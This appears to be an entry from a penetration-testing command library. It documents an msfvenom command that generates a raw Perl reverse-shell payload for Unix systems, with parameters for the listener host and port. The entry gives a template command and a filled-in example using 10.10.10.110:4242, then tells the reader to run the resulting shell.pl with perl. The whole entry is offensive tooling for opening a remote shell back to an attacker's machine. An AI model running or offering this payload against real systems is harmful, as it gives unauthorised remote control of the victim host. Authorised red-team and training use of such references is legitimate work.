---
id: ba38765f-c254-4a69-b093-dcebfd27f01d
name: msfvenom-generate-cmd-unix-reverse-perl-raw
type: command
executor: bash
data: >-
  msfvenom -p cmd/unix/reverse_perl LHOST="$_LHOST" LPORT="$_LPORT" -f raw >
  $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275773+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Unix
tags:
  - perl
  - reverse-shell
verified: true
validated: true
---

# msfvenom-generate-cmd-unix-reverse-perl-raw

## Command

```bash
msfvenom -p cmd/unix/reverse_perl LHOST="$_LHOST" LPORT="$_LPORT" -f raw > $_OUTPUT_FILE
```

## Description

Generates a Perl reverse shell for Unix systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p cmd/unix/reverse_perl | Perl reverse payload | Yes |
| LHOST="$_LHOST" | IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f raw | Raw script | Yes |
| > $_OUTPUT_FILE | Output (e.g., shell.pl) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```

## Expected Output

'shell.pl' script. Run with perl shell.pl.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
